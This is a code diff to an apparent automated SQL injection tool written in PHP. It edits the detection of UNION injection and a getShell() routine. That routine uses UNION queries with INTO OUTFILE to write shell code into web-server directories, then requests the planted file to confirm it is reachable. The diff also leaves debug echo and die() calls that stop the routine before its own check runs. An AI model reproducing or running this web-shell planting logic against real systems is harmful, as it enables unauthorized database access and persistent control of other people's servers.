@@ -225,7 +225,7 @@
 
 										$result	=	$this->query($requestVariable,$callback,$mod_rewrite);
 
-										if($result){
+										if($result){ //Found SQL UNION Injection
 
 											foreach($requestVariables as $key=>$rV){
 												if($key == $requestVariable){
@@ -255,34 +255,13 @@
 
 											return TRUE;
 
-										}else{
-
-											$url	=	$this->_httpAdapter->getUrl();
-
-											//Restore URL Variable or path, depending on what are we trying to do
-											//Inject on the mod_rewrite path, or, injecting query variables
-
-											if($mod_rewrite){
-
-												$url->restorePath($requestVariable);
-												$this->_httpAdapter->setUrl($url);
-
-											}else{
-
-												$url->addRequestVariable($requestVariable,$value); 
-												$this->_httpAdapter->setUrl($url);
-
-											}
-
-
-										}
+										}	//if($result)
 
 									}	//limit
 
 								}	//order
 
 							}	//comment
-
 
 						}	//field-payload
 
@@ -797,6 +776,11 @@
 
 			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler &$crawler){
 
+				if($this->_injection["mod_rewrite"]){
+					$this->log("Sorry, this kind of shell injection wont work with mod_rewrite",1,"red");
+					return FALSE;
+				}
+
 				$shellCode	=	&$this->_shellCode;
 				$restoreUrl	=	clone($this->_httpAdapter->getUrl());
 
@@ -807,6 +791,7 @@
 				}
 
 				$this->buildUnionInjection($shellCode);
+
 				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
 				$information			=	$webDefaultsPlugin->getInfo();
 
@@ -877,7 +862,7 @@
 
 							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"light_cyan");
 
-							$this->buildUnionInjection($shellCode);	
+							$this->buildUnionInjection($shellCode);
 							$this->_queryBuilder->toOutFile($shellDirLocation);
 
 							$sql	=	$this->_injection["requestValue"]			.
@@ -887,13 +872,17 @@
 										$this->_injection["comment"];
 
 							$this->_queryBuilder->setSQL($sql);
+							parent::query($this->_injection["affectedQueryField"],__FUNCTION__,$this->_injection["mod_rewrite"]);	
 
-							$gotShell	=	parent::query($this->_injection["requestVariable"],$this->_injection["mod_rewrite"]);
 							$shellUrl	=	new \aidSQL\core\URL($shellWebLocation);
 							$this->_httpAdapter->setUrl($shellUrl);
 							$parser		=	parent::getParser();
-							$gotShell	=	$parser->analyze($this->_httpAdapter->fetch());
-
+							$content		=	$this->_httpAdapter->fetch();
+							echo $shellUrl."\n";
+							echo $content."\n";
+							die();
+							$gotShell	=	$parser->analyze($content);
+							
 							if($gotShell){
 								$this->_httpAdapter->setUrl($restoreUrl);
 								return $shellUrl;
